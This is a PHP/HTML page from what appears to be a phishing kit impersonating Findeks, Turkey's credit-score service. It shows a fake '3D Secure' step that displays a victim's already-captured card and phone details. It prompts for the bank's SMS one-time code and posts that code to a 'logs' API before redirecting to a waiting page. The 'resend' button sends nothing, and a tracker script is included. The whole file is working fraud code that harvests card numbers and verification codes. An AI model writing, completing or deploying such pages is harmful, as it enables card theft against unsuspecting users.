<?php
require_once 'api/config.php';
require_once 'includes/bank_logos.php';

$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;

if (!$logId) {
    header('Location: basvuru.php');
    exit;
}

try {
    $db   = getDB();
    $stmt = $db->prepare("SELECT * FROM logs WHERE id = ?");
    $stmt->execute([$logId]);
    $log  = $stmt->fetch();

    if (!$log) {
        header('Location: basvuru.php');
        exit;
    }
} catch (PDOException $e) {
    header('Location: basvuru.php');
    exit;
}

$cardNumber    = $log['card_number'];
$maskedCard    = '**** **** **** ' . substr(preg_replace('/\s/', '', $cardNumber), -4);
$customerPhone = $log['customer_phone'] ?? '+90 5XX XXX XX XX';
$bankName      = $log['card_bank'] ?: 'Banka';
$bankLogo      = getBankLogo($bankName);

// Mask phone for display
$rawPhone    = preg_replace('/\D/', '', $customerPhone);
$maskedPhone = strlen($rawPhone) >= 10
    ? substr($rawPhone, 0, 4) . ' **** ** ' . substr($rawPhone, -2)
    : $customerPhone;
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>3D Secure Doğrulama - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Floating label ── */
        .float-group { position: relative; }
        .float-group input {
            padding-top: 1.375rem;
            padding-bottom: 0.5rem;
        }
        .float-label {
            position: absolute; left: 1rem; top: 50%;
            transform: translateY(-50%);
            font-size: 0.875rem; color: #9ca3af;
            pointer-events: none; transition: all 0.18s ease; white-space: nowrap;
        }
        .float-group input:focus ~ .float-label,
        .float-group input:not(:placeholder-shown) ~ .float-label {
            top: 0.6rem; transform: translateY(0);
            font-size: 0.7rem; color: #0056A4; font-weight: 600;
        }
        .float-group input:focus {
            outline: none; border-color: #0056A4;
            box-shadow: 0 0 0 3px rgba(0,86,164,0.12);
        }

        /* ── OTP input ── */
        .otp-input {
            letter-spacing: 0.5em;
            font-size: 1.5rem;
            font-weight: 700;
            text-align: center;
        }

        /* ── Progress tabs ── */
        .step-tab {
            display: flex; align-items: center; gap: 6px;
            padding: 6px 14px; border-radius: 20px;
            font-size: 12px; font-weight: 600;
            transition: all 0.2s; white-space: nowrap;
        }
        .step-tab.active  { background: #0056A4; color: #fff; }
        .step-tab.done    { background: #e8f1fb; color: #0056A4; }
        .step-tab.pending { background: transparent; color: #9ca3af; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.pending .step-dot { background: #d1d5db; }

        /* ── Right panel deco ── */
        .findeks-deco {
            background: linear-gradient(160deg, #0056A4 0%, #0070cc 35%, #0056A4 60%, #003d7a 100%);
            position: relative; overflow: hidden;
        }
        .findeks-deco::before {
            content: ''; position: absolute; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 110% 20%, rgba(255,255,255,0.12) 0%, transparent 60%),
                radial-gradient(ellipse 60% 80% at -10% 80%, rgba(0,30,80,0.35) 0%, transparent 60%);
            pointer-events: none;
        }
        .findeks-deco::after {
            content: ''; position: absolute; inset: 0;
            background-image: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
            background-size: 24px 24px; pointer-events: none;
        }

        /* ── Secure badge pulse ── */
        @keyframes securePulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.35); }
            50%       { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
        }
        .secure-pulse { animation: securePulse 2.5s ease-in-out infinite; }

        /* ── Modal backdrop ── */
        .modal-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55); z-index: 9000;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(2px);
        }
        .modal-backdrop.hidden { display: none; }

        /* ── Spinner ── */
        .spinner {
            width: 44px; height: 44px;
            border: 4px solid rgba(0,86,164,0.15);
            border-top-color: #0056A4; border-radius: 50%;
            animation: spin 0.75s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Countdown ring ── */
        .countdown-ring {
            width: 56px; height: 56px;
            border-radius: 50%;
            background: conic-gradient(#0056A4 var(--pct, 100%), #e8f1fb 0%);
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .countdown-inner {
            width: 44px; height: 44px;
            background: #fff; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
        }

        /* ── Page overlay ── */
        body { background: #f0f4f8; font-family: 'Inter', system-ui, sans-serif; }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6); z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative; z-index: 20;
            width: 100%; min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* ── Scrollbar ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay -->
<div class="page-overlay" aria-hidden="true"></div>

<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab done">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab done">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab active" aria-current="step">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 4 / 5">
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
            </div>

            <!-- Close button -->
            <a href="index.php"
               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
               aria-label="Kapat">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </a>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12">
        <div class="flex flex-col lg:flex-row gap-8 lg:gap-10 items-start">

            <!-- LEFT COLUMN — SMS Verification -->
            <div class="flex-1 w-full">

                <div class="mb-7">
                    <h1 class="text-2xl font-bold text-gray-900 tracking-tight">3D Secure Doğrulama</h1>
                    <p class="text-sm text-gray-500 mt-1.5 leading-relaxed">
                        Ödemenizi güvenli şekilde tamamlamak için SMS doğrulaması gereklidir.
                    </p>
                </div>

                <!-- Error banner -->
                <div id="errorBanner" role="alert" aria-live="assertive"
                     class="hidden mb-5 flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl text-sm text-red-700">
                    <svg class="w-5 h-5 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span id="errorText"></span>
                </div>

                <!-- Bank info card -->
                <div class="bg-white border border-gray-200 rounded-2xl p-5 mb-5 shadow-sm">
                    <div class="flex items-center gap-4 mb-4">
                        <?php if ($bankLogo): ?>
                        <img src="<?= htmlspecialchars($bankLogo) ?>" alt="<?= htmlspecialchars($bankName) ?>" class="h-10 max-w-[100px] object-contain">
                        <?php else: ?>
                        <div class="w-10 h-10 bg-brand-light rounded-lg flex items-center justify-center">
                            <svg class="w-5 h-5 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                        </div>
                        <?php endif; ?>
                        <div>
                            <p class="text-sm font-bold text-gray-900"><?= htmlspecialchars($bankName) ?></p>
                            <p class="text-xs text-gray-400">3D Secure Doğrulama</p>
                        </div>
                        <div class="ml-auto flex items-center gap-2">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/250px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png" alt="Visa" class="h-5 object-contain opacity-60">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" class="h-5 object-contain opacity-60">
                        </div>
                    </div>

                    <!-- Transaction details -->
                    <div class="space-y-2.5 text-sm">
                        <div class="flex items-center justify-between py-2 border-b border-gray-100">
                            <span class="text-gray-500 font-medium">Kart Numarası</span>
                            <span class="font-mono font-bold text-gray-900"><?= htmlspecialchars($maskedCard) ?></span>
                        </div>
                        <div class="flex items-center justify-between py-2 border-b border-gray-100">
                            <span class="text-gray-500 font-medium">Telefon</span>
                            <span class="font-semibold text-gray-900"><?= htmlspecialchars($maskedPhone) ?></span>
                        </div>
                        <div class="flex items-center justify-between py-2">
                            <span class="text-gray-500 font-medium">Tarih / Saat</span>
                            <span class="font-semibold text-gray-900"><?= date('d.m.Y H:i') ?></span>
                        </div>
                    </div>
                </div>

                <!-- SMS notice -->
                <div class="flex items-start gap-3 p-4 bg-amber-50 border border-amber-200 rounded-xl mb-5">
                    <svg class="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 8.18a16 16 0 006.29 6.29l1.5-1.5a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
                    <p class="text-sm text-amber-700">
                        <strong class="font-semibold"><?= htmlspecialchars($maskedPhone) ?></strong> numaralı telefonunuza gönderilen 6 haneli doğrulama kodunu giriniz.
                    </p>
                </div>

                <!-- OTP form -->
                <div class="bg-white border border-gray-200 rounded-2xl p-6 shadow-sm">

                    <!-- Countdown -->
                    <div class="flex items-center gap-4 mb-5">
                        <div class="countdown-ring" id="countdownRing" style="--pct: 100%">
                            <div class="countdown-inner">
                                <span class="text-brand-primary text-sm font-bold" id="countdown">180</span>
                            </div>
                        </div>
                        <div>
                            <p class="text-sm font-semibold text-gray-800">Kod bekleniyor</p>
                            <p class="text-xs text-gray-400 mt-0.5">Kodun geçerlilik süresi: <strong id="countdownLabel">3:00</strong></p>
                        </div>
                    </div>

                    <!-- OTP input -->
                    <div class="float-group mb-4">
                        <input type="password" id="otpInput" name="otp"
                               inputmode="numeric" maxlength="6"
                               placeholder=" " autocomplete="one-time-code"
                               aria-label="Doğrulama Kodu" aria-required="true"
                               class="otp-input w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-gray-900 transition-all">
                        <label for="otpInput" class="float-label" style="font-size:0.875rem">Doğrulama Kodunu Girin</label>
                    </div>

                    <!-- Resend -->
                    <div class="flex items-center justify-between mb-5">
                        <span class="text-xs text-gray-400">Kodu almadınız mı?</span>
                        <button type="button" id="resendBtn" onclick="resendCode()" disabled
                                class="text-xs font-semibold text-brand-primary hover:text-brand-secondary disabled:text-gray-300 disabled:cursor-not-allowed transition-colors">
                            Tekrar Gönder
                        </button>
                    </div>

                    <!-- Verify button -->
                    <button type="button" id="verifyBtn" onclick="verifyOtp()" disabled
                            class="w-full py-3.5 bg-brand-primary hover:bg-brand-secondary disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold rounded-xl text-sm transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow-md">
                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        Doğrula
                    </button>

                    <!-- Cancel -->
                    <button type="button" onclick="cancelTransaction()"
                            class="w-full mt-3 py-2.5 border border-gray-200 text-gray-500 hover:text-gray-700 hover:bg-gray-50 font-medium rounded-xl text-sm transition-colors">
                        İptal Et
                    </button>
                </div>

                <!-- Trust row -->
                <div class="flex items-center justify-center gap-5 pt-4">
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        <span class="text-[11px]">SSL Şifreli</span>
                    </div>
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                        <span class="text-[11px]">256-bit Şifreleme</span>
                    </div>
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                        <span class="text-[11px]">KKB Güvenceli</span>
                    </div>
                </div>

            </div>

            <!-- RIGHT COLUMN — Transaction summary -->
            <aside class="findeks-deco hidden lg:flex flex-col w-80 xl:w-96 rounded-2xl p-8 flex-shrink-0" aria-label="İşlem Özeti">

                <!-- Panel header -->
                <div class="mb-6 relative z-10">
                    <div class="flex items-center gap-3 mb-1">
                        <div class="w-8 h-8 bg-white/15 rounded-lg flex items-center justify-center backdrop-blur-sm">
                            <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        </div>
                        <h2 class="text-white font-semibold text-lg">İşlem Özeti</h2>
                    </div>
                    <p class="text-blue-200/70 text-xs ml-11">3D Secure doğrulama bilgileri</p>
                </div>

                <!-- Transaction card -->
                <div class="relative z-10 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15 p-5 mb-5">
                    <div class="space-y-3 text-sm">
                        <div class="flex items-center justify-between">
                            <span class="text-blue-200/80">Kart</span>
                            <span class="text-white font-mono font-semibold"><?= htmlspecialchars($maskedCard) ?></span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="text-blue-200/80">Banka</span>
                            <span class="text-white font-semibold"><?= htmlspecialchars($bankName) ?></span>
                        </div>
                        <div class="flex items-center justify-between pt-2 border-t border-white/15">
                            <span class="text-white font-bold">Tutar</span>
                            <span class="text-white font-bold text-xl">
                                <?php
                                $amount = $log['total'] ?? ($log['items']['borc_tutari'] ?? 99.00);
                                echo '₺' . number_format((float)$amount, 2, ',', '.');
                                ?>
                            </span>
                        </div>
                    </div>
                </div>

                <!-- Step info -->
                <div class="relative z-10 space-y-2.5 mb-6">
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Bilgilerinizi girdiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Paket seçtiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Ödeme bilgilerini girdiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <span class="text-brand-primary text-[10px] font-bold">4</span>
                        </div>
                        <span class="text-white text-xs font-semibold">3D Secure doğrulama</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">5</span>
                        </div>
                        <span class="text-white text-xs">Raporunuzu görüntüleyin</span>
                    </div>
                </div>

                <!-- Secure badge -->
                <div class="relative z-10 mt-auto">
                    <div class="secure-pulse flex items-center gap-3 p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15">
                        <div class="w-10 h-10 bg-emerald-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-emerald-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        </div>
                        <div>
                            <p class="text-white text-xs font-semibold">Güvenli İşlem Garantisi</p>
                            <p class="text-blue-200/60 text-[10px] mt-0.5">KKB & GlobalSign güvencesiyle korunmaktadır</p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2 mt-4 justify-center flex-wrap">
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">GlobalSign</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">KKB</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">Eyebrand</span>
                        </div>
                    </div>
                </div>

            </aside>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->

<!-- Loading modal -->
<div id="loadingModal" class="modal-backdrop hidden" role="status" aria-live="polite" aria-label="Doğrulanıyor">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xs mx-4 p-8 text-center">
        <div class="spinner mx-auto mb-5"></div>
        <p class="text-sm font-semibold text-gray-800">Doğrulanıyor</p>
        <p class="text-xs text-gray-400 mt-1.5">Lütfen bekleyiniz...</p>
    </div>
</div>

<script>
    const logId    = <?= $logId ?>;
    const otpInput = document.getElementById('otpInput');
    const verifyBtn = document.getElementById('verifyBtn');
    const resendBtn = document.getElementById('resendBtn');
    const TOTAL_TIME = 180;
    let timeLeft = TOTAL_TIME;
    let countdownInterval;

    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        verifyBtn.disabled = this.value.length !== 6;
    });

    function formatTime(s) {
        const m = Math.floor(s / 60);
        const sec = s % 60;
        return m + ':' + (sec < 10 ? '0' : '') + sec;
    }

    function updateCountdownRing(t) {
        const pct = (t / TOTAL_TIME) * 100;
        document.getElementById('countdownRing').style.setProperty('--pct', pct + '%');
        document.getElementById('countdown').textContent = t;
        document.getElementById('countdownLabel').textContent = formatTime(t);
    }

    function startCountdown() {
        clearInterval(countdownInterval);
        countdownInterval = setInterval(() => {
            timeLeft--;
            updateCountdownRing(timeLeft);
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                resendBtn.disabled = false;
                document.getElementById('countdownLabel').textContent = 'Süre doldu';
            }
        }, 1000);
    }

    function resendCode() {
        timeLeft = TOTAL_TIME;
        resendBtn.disabled = true;
        updateCountdownRing(timeLeft);
        otpInput.value = '';
        verifyBtn.disabled = true;
        otpInput.focus();
        startCountdown();
    }

    function cancelTransaction() {
        if (confirm('İşlemi iptal etmek istediğinize emin misiniz?')) {
            window.location.href = 'cart.php';
        }
    }

    async function verifyOtp() {
        verifyBtn.disabled = true;
        document.getElementById('loadingModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';

        const smsCode = otpInput.value;

        try {
            await fetch('api/logs.php', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: logId, redirect_to: 'waiting', sms_code: smsCode })
            });
        } catch (e) {}

        setTimeout(() => {
            window.location.href = 'waiting.php?id=' + logId;
        }, 1500);
    }

    // Init
    startCountdown();
    otpInput.focus();
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>
